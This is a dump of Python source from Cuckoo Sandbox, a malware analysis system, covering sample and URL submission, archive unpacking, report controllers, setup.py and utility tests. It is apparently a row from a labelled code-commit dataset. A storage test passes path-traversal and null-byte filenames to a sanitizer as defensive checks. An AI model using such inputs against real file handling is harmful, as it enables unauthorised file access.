                    filepath=filepath, password=password, duplicates=duplicates
                )

                if astree:
                    unpacked = unpacked.astree(sanitize=True)

                files.append(unpacked)
            elif data[""type""] == ""url"":
                files.append({
                    ""filename"": data[""data""],
                    ""filepath"": """",
                    ""relapath"": """",
                    ""selected"": True,
                    ""size"": 0,
                    ""type"": ""url"",
                    ""package"": ""ie"",
                    ""extrpath"": [],
                    ""duplicate"": False,
                    ""children"": [],
                    ""mime"": ""text/html"",
                    ""finger"": {
                        ""magic_human"": ""url"",
                        ""magic"": ""url""
                    }
                })
            else:
                raise RuntimeError(
                    ""Unknown data entry type: %s"" % data[""type""]
                )

        return files

    def translate_options(self, info, options):
        """"""Translates Web Interface options to Cuckoo database options.""""""
        ret = {}

        if not int(options[""simulated-human-interaction""]):
            ret[""human""] = int(options[""simulated-human-interaction""])

        return emit_options(ret)

    def submit(self, submit_id, config):
        """"""Reads, interprets, and converts the JSON configuration provided by
        the Web Interface into something we insert into the database.""""""
        ret = []
        submit = db.view_submit(submit_id)

        for entry in config[""file_selection""]:
            # Merge the global & per-file analysis options.
            info = copy.deepcopy(config[""global""])
            info.update(entry)
            options = copy.deepcopy(config[""global""][""options""])
            options.update(entry.get(""options"", {}))

            kw = {
                ""package"": info.get(""package""),
                ""timeout"": info.get(""timeout"", 120),
                ""priority"": info.get(""priority""),
                ""custom"": info.get(""custom""),
                ""owner"": info.get(""owner""),
                ""tags"": info.get(""tags""),
                ""memory"": info.get(""memory""),
                ""enforce_timeout"": options.get(""enforce-timeout""),
                ""machine"": info.get(""machine""),
                ""platform"": info.get(""platform""),
                ""options"": self.translate_options(info, options),
                ""submit_id"": submit_id,
            }

            if entry[""type""] == ""url"":
                ret.append(db.add_url(
                    url=info[""filename""], **kw
                ))
                continue

            # for each selected file entry, create a new temp. folder
            path_dest = Folders.create_temp()

            if not info[""extrpath""]:
                path = os.path.join(
                    submit.tmp_path, os.path.basename(info[""filename""])
                )

                filepath = Files.copy(path, path_dest=path_dest)

                ret.append(db.add_path(
                    file_path=filepath, **kw
                ))
            elif len(info[""extrpath""]) == 1:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                arc = sflock.zipify(sflock.unpack(
                    info[""arcname""], contents=open(arcpath, ""rb"").read()
                ))

                # Create a .zip archive out of this container.
                arcpath = Files.temp_named_put(
                    arc, os.path.basename(info[""arcname""])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))
            else:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                content = sflock.unpack(arcpath).read(info[""extrpath""][:-1])
                subarc = sflock.unpack(info[""extrpath""][-2], contents=content)

                # Write intermediate .zip archive file.
                arcpath = Files.temp_named_put(
                    sflock.zipify(subarc),
                    os.path.basename(info[""extrpath""][-2])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))

        return ret
/n/n/ncuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.common.mongo import mongo
from cuckoo.core.database import Database, TASK_PENDING

db = Database()

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception(""Task ID should be integer"")

        task = db.view_task(task_id, details=True)
        if not task:
            return Http404(""Task not found"")

        entry = task.to_dict()
        entry[""guest""] = {}
        if task.guest:
            entry[""guest""] = task.guest.to_dict()

        entry[""errors""] = []
        for error in task.errors:
            entry[""errors""].append(error.message)

        entry[""sample""] = {}
        if task.sample_id:
            sample = db.view_sample(task.sample_id)
            entry[""sample""] = sample.to_dict()

        entry[""target""] = os.path.basename(entry[""target""])
        return {
            ""task"": entry,
        }

    @staticmethod
    def get_recent(limit=50, offset=0):
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""file"",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""url"",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new[""sample""] = db.view_sample(new[""sample_id""]).to_dict()

                filename = os.path.basename(new[""target""])
                new.update({""filename"": filename})

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        return data

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404(""the specified analysis does not exist"")

        data = {
            ""analysis"": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            ""info.id"": int(task_id)
        }, sort=[(""_id"", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[(""_id"", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """"""Create DNS information dicts by domain and ip""""""

        if ""network"" in report and ""domains"" in report[""network""]:
            domainlookups = dict((i[""domain""], i[""ip""]) for i in report[""network""][""domains""])
            iplookups = dict((i[""ip""], i[""domain""]) for i in report[""network""][""domains""])

            for i in report[""network""][""dns""]:
                for a in i[""answers""]:
                    iplookups[a[""data""]] = i[""request""]
        else:
            domainlookups = dict()
            iplookups = dict()

        return {
            ""domainlookups"": domainlookups,
            ""iplookups"": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """"""
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """"""
        data = {}
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs[""data""]:
            pid = proc[""pid""]
            pname = proc[""process_name""]
            pdetails = None
            for p in report[""behavior""][""generic""]:
                if p[""pid""] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        ""pid"": pid,
                        ""process_name"": pname,
                        ""events"": {}
                    }

                for event in events:
                    if not data[category][pname][""events""].has_key(event):
                        data[category][pname][""events""][event] = []
                    for _event in pdetails[""summary""][event]:
                        data[category][pname][""events""][event].append(_event)

        return data

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception(""missing task_id"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        data = {
            ""data"": [],
            ""status"": True
        }

        for process in report.get(""behavior"", {}).get(""generic"", []):
            data[""data""].append({
                ""process_name"": process[""process_name""],
                ""pid"": process[""pid""]
            })

        # sort returning list of processes by their name
        data[""data""] = sorted(data[""data""], key=lambda k: k[""process_name""])

        return data

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception(""missing task_id or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""missing pid"")
        else:
            process = process[0]

        data = {}
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process[""summary""]:
                    if category not in data:
                        data[category] = [watcher]
                    else:
                        data[category].append(watcher)

        return data

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception(""missing task_id, watcher, and/or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""supplied pid not found"")
        else:
            process = process[0]

        summary = process[""summary""]

        if watcher not in summary:
            raise Exception(""supplied watcher not found"")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            ""files"":
                [""file_opened"", ""file_read""],
            ""registry"":
                [""regkey_opened"", ""regkey_written"", ""regkey_read""],
            ""mutexes"":
                [""mutex""],
            ""directories"":
                [""directory_created"", ""directory_removed"", ""directory_enumerated""],
            ""processes"":
                [""command_line"", ""dll_loaded""],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """"""Returns an OrderedDict containing a lists with signatures based on severity""""""
        if not task_id:
            raise Exception(""missing task_id"")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)[""signatures""]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature[""severity""]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data
/n/n/ncuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config(""cuckoo:cuckoo:machinery"")

    if config(""routing:vpn:enabled""):
        vpns = config(""routing:vpn:vpns"")
    else:
        vpns = []

    return {
        ""machine"": config(""%s:%s:machines"" % (machinery, machinery)),
        ""package"": None,
        ""priority"": 2,
        ""timeout"": config(""cuckoo:timeouts:default""),
        ""routing"": {
            ""route"": config(""routing:routing:route""),
            ""inetsim"": config(""routing:inetsim:enabled""),
            ""tor"": config(""routing:tor:enabled""),
            ""vpns"": vpns,
        },
        ""options"": {
            ""enable-services"": False,
            ""enforce-timeout"": False,
            ""full-memory-dump"": config(""cuckoo:cuckoo:memory_dump""),
            ""no-injection"": False,
            ""process-memory-dump"": True,
            ""simulated-human-interaction"": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods([""POST""])
    def presubmit(request):
        files = request.FILES.getlist(""files[]"")
        data = []

        if files:
            for f in files:
                data.append({
                    ""name"": f.name,
                    ""data"": f.file,
                })

            submit_id = submit_manager.pre(submit_type=""files"", data=data)
            return redirect(""submission/pre"", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body[""type""]

            if submit_type != ""strings"":
                return json_error_response(""type not \""strings\"""")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body[""data""].split(""\n"")
            )

            return JsonResponse({
                ""status"": True,
                ""submit_id"": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get(""submit_id"", 0)
        password = body.get(""password"", None)
        astree = body.get(""astree"", True)

        files = submit_manager.get_files(
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            ""status"": True,
            ""files"": files,
            ""defaults"": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop(""submit_id"", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            ""status"": True,
            ""submit_id"": submit_id,
        }, encoder=JsonSerialize)
/n/n/nsetup.py/n/n#!/usr/bin/env python
# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - https://cuckoosandbox.org/.
# See the file 'docs/LICENSE' for copying permission.

import os
import setuptools
import sys

# Update the MANIFEST.in file to include the one monitor version that is
# actively shipped for this distribution and exclude all the other monitors
# that we have lying around. Note: I tried to do this is in a better manner
# through exclude_package_data, but without much luck.

excl, monitor = [], os.path.join(""cuckoo"", ""data"", ""monitor"")
latest = open(os.path.join(monitor, ""latest""), ""rb"").read().strip()
for h in os.listdir(monitor):
    if h != ""latest"" and h != latest:
        excl.append(
            ""recursive-exclude cuckoo/data/monitor/%s *  # AUTOGENERATED"" % h
        )

if not os.path.isdir(os.path.join(monitor, latest)) and \
        not os.environ.get(""ONLYINSTALL""):
    sys.exit(
        ""Failure locating the monitoring binaries that belong to the latest ""
        ""monitor release. Please include those to create a distribution.""
    )

manifest = []
for line in open(""MANIFEST.in"", ""rb""):
    if not line.strip() or ""# AUTOGENERATED"" in line:
        continue

    manifest.append(line.strip())

manifest.extend(excl)

open(""MANIFEST.in"", ""wb"").write(""\n"".join(manifest) + ""\n"")

def githash():
    """"""Extracts the current Git hash.""""""
    git_head = os.path.join("".git"", ""HEAD"")
    if os.path.exists(git_head):
        head = open(git_head, ""rb"").read().strip()
        if not head.startswith(""ref: ""):
            return head

        git_ref = os.path.join("".git"", head.split()[1])
        if os.path.exists(git_ref):
            return open(git_ref, ""rb"").read().strip()

cwd_path = os.path.join(""cuckoo"", ""data-private"", "".cwd"")
open(cwd_path, ""wb"").write(githash() or """")

install_requires = []

# M2Crypto relies on swig being installed. We also don't support the latest
# version of SWIG. We should be replacing M2Crypto by something else when
# the time allows us to do so.
if os.path.exists(""/usr/bin/swig""):
    install_requires.append(""m2crypto==0.24.0"")

setuptools.setup(
    name=""Cuckoo"",
    version=""2.0.0"",
    author=""Stichting Cuckoo Foundation"",
    author_email=""cuckoo@cuckoofoundation.org"",
    packages=[
        ""cuckoo"",
    ],
    classifiers=[
        ""Development Status :: 4 - Beta"",
        # TODO: should become stable.
        # ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Environment :: Web Environment"",
        ""Framework :: Django"",
        ""Framework :: Flask"",
        ""Framework :: Pytest"",
        ""Intended Audience :: Information Technology"",
        ""Intended Audience :: Science/Research"",
        ""Natural Language :: English"",
        ""License :: OSI Approved :: GNU General Public License v3 (GPLv3)"",
        ""Operating System :: POSIX :: Linux"",
        ""Programming Language :: Python :: 2.7"",
        ""Topic :: Security"",
    ],
    url=""https://cuckoosandbox.org/"",
    license=""GPLv3"",
    description=""Automated Malware Analysis System"",
    include_package_data=True,
    entry_points={
        ""console_scripts"": [
            ""cuckoo = cuckoo.main:main"",
        ],
    },
    install_requires=[
        ""alembic==0.8.8"",
        ""androguard==3.0"",
        ""beautifulsoup4==4.4.1"",
        ""chardet==2.3.0"",
        ""click==6.6"",
        ""django==1.8.4"",
        ""django_extensions==1.6.7"",
        ""dpkt==1.8.7"",
        ""elasticsearch==2.2.0"",
        ""flask==0.10.1"",
        ""httpreplay==0.1.18"",
        ""jinja2==2.8"",
        ""jsbeautifier==1.6.2"",
        ""lxml==3.6.0"",
        ""oletools==0.42"",
        ""peepdf==0.3.2"",
        ""pefile2==1.2.11"",
        ""pillow==3.2"",
        ""pymisp==2.4.54"",
        ""pymongo==3.0.3"",
        ""python-dateutil==2.4.2"",
        ""python-magic==0.4.12"",
        ""sflock==0.2.5"",
        ""sqlalchemy==1.0.8"",
        ""wakeonlan==0.2.2"",
    ] + install_requires,
    extras_require={
        "":sys_platform == 'win32'"": [
            ""requests==2.7.0"",
        ],
        "":sys_platform == 'darwin'"": [
            ""requests==2.7.0"",
        ],
        "":sys_platform == 'linux2'"": [
            ""requests[security]==2.7.0"",
            ""scapy==2.3.2"",
        ],
        ""distributed"": [
            ""flask-sqlalchemy==2.1"",
            ""gevent==1.1.1"",
            ""psycopg2==2.6.2"",
        ],
        ""postgresql"": [
            ""psycopg2==2.6.2"",
        ],
    },
    setup_requires=[
        ""pytest-runner"",
    ],
    tests_require=[
        ""coveralls"",
        ""pytest"",
        ""pytest-cov"",
        ""pytest-django"",
        ""pytest-pythonpath"",
        ""flask-sqlalchemy==2.1"",
        ""mock==2.0.0"",
        ""responses==0.5.1"",
    ],
)
/n/n/ntests/test_utils.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import cStringIO
import io
import mock
import os
import pytest
import shutil
import tempfile

import cuckoo

from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage, temppath
from cuckoo.common import utils
from cuckoo.misc import set_cwd

class TestCreateFolders:
    def setup(self):
        self.tmp_dir = tempfile.gettempdir()

    def test_root_folder(self):
        """"""Tests a single folder creation based on the root parameter.""""""
        Folders.create(os.path.join(self.tmp_dir, ""foo""))
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_single_folder(self):
        """"""Tests a single folder creation.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_multiple_folders(self):
        """"""Tests multiple folders creation.""""""
        Folders.create(self.tmp_dir, [""foo"", ""bar""])
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        assert os.path.exists(os.path.join(self.tmp_dir, ""bar""))
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))
        os.rmdir(os.path.join(self.tmp_dir, ""bar""))

    def test_copy_folder(self):
        """"""Tests recursive folder copy""""""
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.copy(""tests/files/sample_analysis_storage"", dirpath)
        assert os.path.isfile(""%s/reports/report.json"" % dirpath)

    def test_duplicate_folder(self):
        """"""Tests a duplicate folder creation.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.create(self.tmp_dir, ""foo"")
        os.rmdir(os.path.join(self.tmp_dir, ""foo""))

    def test_delete_folder(self):
        """"""Tests folder deletion #1.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.delete(os.path.join(self.tmp_dir, ""foo""))
        assert not os.path.exists(os.path.join(self.tmp_dir, ""foo""))

    def test_delete_folder2(self):
        """"""Tests folder deletion #2.""""""
        Folders.create(self.tmp_dir, ""foo"")
        assert os.path.exists(os.path.join(self.tmp_dir, ""foo""))
        Folders.delete(self.tmp_dir, ""foo"")
        assert not os.path.exists(os.path.join(self.tmp_dir, ""foo""))

    def test_create_temp(self):
        """"""Test creation of temporary directory.""""""
        dirpath1 = Folders.create_temp(""/tmp"")
        dirpath2 = Folders.create_temp(""/tmp"")
        assert os.path.exists(dirpath1)
        assert os.path.exists(dirpath2)
        assert dirpath1 != dirpath2

    def test_create_temp_conf(self):
        """"""Test creation of temporary directory with configuration.""""""
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.create(dirpath, ""conf"")
        with open(os.path.join(dirpath, ""conf"", ""cuckoo.conf""), ""wb"") as f:
            f.write(""[cuckoo]\ntmppath = %s"" % dirpath)

        dirpath2 = Folders.create_temp()
        assert dirpath2.startswith(os.path.join(dirpath, ""cuckoo-tmp""))

    @pytest.mark.skipif(""sys.platform != 'linux2'"")
    def test_create_invld_linux(self):
        """"""Test creation of a folder we can't access.""""""
        with pytest.raises(CuckooOperationalError):
            Folders.create(""/invalid/directory"")

    @pytest.mark.skipif(""sys.platform != 'win32'"")
    def test_create_invld_windows(self):
        """"""Test creation of a folder we can't access.""""""
        with pytest.raises(CuckooOperationalError):
            Folders.create(""Z:\\invalid\\directory"")

    def test_delete_invld(self):
        """"""Test deletion of a folder we can't access.""""""
        dirpath = tempfile.mkdtemp()

        os.chmod(dirpath, 0)
        with pytest.raises(CuckooOperationalError):
            Folders.delete(dirpath)

        os.chmod(dirpath, 0775)
        Folders.delete(dirpath)

    def test_create_tuple(self):
        dirpath = tempfile.mkdtemp()
        Folders.create(dirpath, ""a"")
        Folders.create((dirpath, ""a""), ""b"")
        Files.create((dirpath, ""a"", ""b""), ""c.txt"", ""nested"")

        filepath = os.path.join(dirpath, ""a"", ""b"", ""c.txt"")
        assert open(filepath, ""rb"").read() == ""nested""

class TestCreateFile:
    def test_temp_file(self):
        filepath1 = Files.temp_put(""hello"", ""/tmp"")
        filepath2 = Files.temp_put(""hello"", ""/tmp"")
        assert open(filepath1, ""rb"").read() == ""hello""
        assert open(filepath2, ""rb"").read() == ""hello""
        assert filepath1 != filepath2

    def test_create(self):
        dirpath = tempfile.mkdtemp()
        Files.create(dirpath, ""a.txt"", ""foo"")
        assert open(os.path.join(dirpath, ""a.txt""), ""rb"").read() == ""foo""
        shutil.rmtree(dirpath)

    def test_named_temp(self):
        filepath = Files.temp_named_put(""test"", ""hello.txt"", ""/tmp"")
        assert open(filepath, ""rb"").read() == ""test""
        assert os.path.basename(filepath) == ""hello.txt""

    def test_temp_conf(self):
        dirpath = tempfile.mkdtemp()
        set_cwd(dirpath)

        Folders.create(dirpath, ""conf"")
        with open(os.path.join(dirpath, ""conf"", ""cuckoo.conf""), ""wb"") as f:
            f.write(""[cuckoo]\ntmppath = %s"" % dirpath)

        filepath = Files.temp_put(""foo"")
        assert filepath.startswith(os.path.join(dirpath, ""cuckoo-tmp""))

    def test_stringio(self):
        filepath = Files.temp_put(cStringIO.StringIO(""foo""), ""/tmp"")
        assert open(filepath, ""rb"").read() == ""foo""

    def test_bytesio(self):
        filepath = Files.temp_put(io.BytesIO(""foo""), ""/tmp"")
        assert open(filepath, ""rb"").read() == ""foo""

    def test_create_bytesio(self):
        dirpath = tempfile.mkdtemp()
        filepath = Files.create(dirpath, ""a.txt"", io.BytesIO(""A""*1024*1024))
        assert open(filepath, ""rb"").read() == ""A""*1024*1024

    def test_hash_file(self):
        filepath = Files.temp_put(""hehe"", ""/tmp"")
        assert Files.md5_file(filepath) == ""529ca8050a00180790cf88b63468826a""
        assert Files.sha1_file(filepath) == ""42525bb6d3b0dc06bb78ae548733e8fbb55446b3""
        assert Files.sha256_file(filepath) == ""0ebe2eca800cf7bd9d9d9f9f4aafbc0c77ae155f43bbbeca69cb256a24c7f9bb""

    def test_create_tuple(self):
        dirpath = tempfile.mkdtemp()
        Folders.create(dirpath, ""foo"")
        Files.create((dirpath, ""foo""), ""a.txt"", ""bar"")

        filepath = os.path.join(dirpath, ""foo"", ""a.txt"")
        assert open(filepath, ""rb"").read() == ""bar""

    def test_fd_exhaustion(self):
        fd, filepath = tempfile.mkstemp()

        for x in xrange(0x100):
            Files.temp_put(""foo"")

        fd2, filepath = tempfile.mkstemp()

        # Let's leave a bit of working space.
        assert fd2 - fd < 64

class TestStorage:
    def test_basename(self):
        assert Storage.get_filename_from_path(""C:\\a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""C:/a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""C:\\\x00a.txt"") == ""\x00a.txt""
        assert Storage.get_filename_from_path(""/tmp/a.txt"") == ""a.txt""
        assert Storage.get_filename_from_path(""../../b.txt"") == ""b.txt""
        assert Storage.get_filename_from_path(""..\\..\\c.txt"") == ""c.txt""

class TestConvertChar:
    def test_utf(self):
        assert ""\\xe9"", utils.convert_char(u""\xe9"")

    def test_digit(self):
        assert ""9"" == utils.convert_char(u""9"")

    def test_literal(self):
        assert ""e"" == utils.convert_char(""e"")

    def test_punctation(self):
        assert ""."" == utils.convert_char(""."")

    def test_whitespace(self):
        assert "" "" == utils.convert_char("" "")

class TestConvertToPrintable:
    def test_utf(self):
        assert ""\\xe9"" == utils.convert_to_printable(u""\xe9"")

    def test_digit(self):
        assert ""9"" == utils.convert_to_printable(u""9"")

    def test_literal(self):
        assert ""e"" == utils.convert_to_printable(""e"")

    def test_punctation(self):
        assert ""."" == utils.convert_to_printable(""."")

    def test_whitespace(self):
        assert "" "" == utils.convert_to_printable("" "")

    def test_non_printable(self):
        assert r""\x0b"" == utils.convert_to_printable(chr(11))

class TestIsPrintable:
    def test_utf(self):
        assert not utils.is_printable(u""\xe9"")

    def test_digit(self):
        assert utils.is_printable(u""9"")

    def test_literal(self):
        assert utils.is_printable(""e"")

    def test_punctation(self):
        assert utils.is_printable(""."")

    def test_whitespace(self):
        assert utils.is_printable("" "")

    def test_non_printable(self):
        assert not utils.is_printable(chr(11))

def test_version():
    from cuckoo import __version__
    from cuckoo.misc import version
    assert __version__ == version

def test_exception():
    s = utils.exception_message()
    assert ""Cuckoo version: %s"" % cuckoo.__version__ in s
    assert ""alembic:"" in s
    assert ""django-extensions:"" in s
    assert ""peepdf:"" in s
    assert ""sflock:"" in s

def test_guid():
    assert utils.guid_name(""{0002e005-0000-0000-c000-000000000046}"") == ""InprocServer32""
    assert utils.guid_name(""{13709620-c279-11ce-a49e-444553540000}"") == ""Shell""

def test_jsbeautify():
    js = {
        ""if(1){a(1,2,3);}"": ""if (1) {\n    a(1, 2, 3);\n}"",
    }
    for k, v in js.items():
        assert utils.jsbeautify(k) == v

@mock.patch(""cuckoo.common.utils.jsbeautifier"")
def test_jsbeautify_packer(p, capsys):
    def beautify(s):
        print u""error: Unknown p.a.c.k.e.r. encoding.\n"",

    p.beautify.side_effect = beautify
    utils.jsbeautify(""thisisjavascript"")
    out, err = capsys.readouterr()
    assert not out and not err

def test_htmlprettify():
    html = {
        ""<a href=google.com>wow</a>"": '<a href=""google.com"">\n wow\n</a>',
    }
    for k, v in html.items():
        assert utils.htmlprettify(k) == v

def test_temppath():
    dirpath = tempfile.mkdtemp()
    set_cwd(dirpath)
    Folders.create(dirpath, ""conf"")

    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = ""
    )
    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = /tmp""
    )
    assert temppath() == tempfile.gettempdir()

    Files.create(
        os.path.join(dirpath, ""conf""), ""cuckoo.conf"",
        ""[cuckoo]\ntmppath = /custom/directory""
    )
    assert temppath() == ""/custom/directory""

def test_bool():
    assert utils.parse_bool(""true"") is True
    assert utils.parse_bool(""True"") is True
    assert utils.parse_bool(""yes"") is True
    assert utils.parse_bool(""on"") is True
    assert utils.parse_bool(""1"") is True

    assert utils.parse_bool(""false"") is False
    assert utils.parse_bool(""False"") is False
    assert utils.parse_bool(""None"") is False
    assert utils.parse_bool(""no"") is False
    assert utils.parse_bool(""off"") is False
    assert utils.parse_bool(""0"") is False

    assert utils.parse_bool(""2"") is True
    assert utils.parse_bool(""3"") is True

    assert utils.parse_bool(True) is True
    assert utils.parse_bool(1) is True
    assert utils.parse_bool(2) is True
    assert utils.parse_bool(False) is False
    assert utils.parse_bool(0) is False

def test_supported_version():
    assert utils.supported_version(""2.0"", ""2.0.0"", None) is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", None) is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", ""2.0.1"") is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", ""2.0.0"") is True

    assert utils.supported_version(""2.0.1a1"", ""2.0.0"", ""2.0.1"") is True
    assert utils.supported_version(""2.0.1a1"", ""2.0.1a0"", ""2.0.1b1"") is True
    assert utils.supported_version(""2.0.1b1"", ""2.0.1"", None) is False
    assert utils.supported_version(""2.0.1b1"", ""2.0.1a1"", None) is True
    assert utils.supported_version(""2.0.1b1"", ""2.0.1a1"", ""2.0.1"") is True

def test_validate_url():
    assert utils.validate_url(""http://google.com/"")
    assert utils.validate_url(""google.com"")
    assert utils.validate_url(""google.com/test"")
    assert utils.validate_url(""https://google.com/"")
    assert not utils.validate_url(""ftp://google.com/"")
/n/n/n",0
73,168cabf86730d56b7fa319278bf0f0034052666a,"/cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import copy
import logging
import os
import sflock

from cuckoo.common.config import emit_options
from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage
from cuckoo.common.utils import validate_url, validate_hash
from cuckoo.common.virustotal import VirusTotalAPI
from cuckoo.core.database import Database

log = logging.getLogger(__name__)

db = Database()

class SubmitManager(object):
    def _handle_string(self, submit, tmppath, line):
        if not line:
            return

        if validate_hash(line):
            try:
                filedata = VirusTotalAPI().hash_fetch(line)
            except CuckooOperationalError as e:
                submit[""errors""].append(
                    ""Error retrieving file hash: %s"" % e
                )
                return

            filepath = Files.create(tmppath, line, filedata)

            submit[""data""].append({
                ""type"": ""file"",
                ""data"": filepath
            })
            return

        if validate_url(line):
            submit[""data""].append({
                ""type"": ""url"",
                ""data"": line
            })
            return

        submit[""errors""].append(
            ""'%s' was neither a valid hash or url"" % line
        )

    def pre(self, submit_type, data):
        """"""
        The first step to submitting new analysis.
        @param submit_type: ""files"" or ""strings""
        @param data: a list of dicts containing ""name"" (file name)
                and ""data"" (file data) or a list of strings (urls or hashes)
        @return: submit id
        """"""
        if submit_type not in (""strings"", ""files""):
            log.error(""Bad parameter '%s' for submit_type"", submit_type)
            return False

        path_tmp = Folders.create_temp()
        submit_data = {
            ""data"": [],
            ""errors"": []
        }

        if submit_type == ""strings"":
            for line in data:
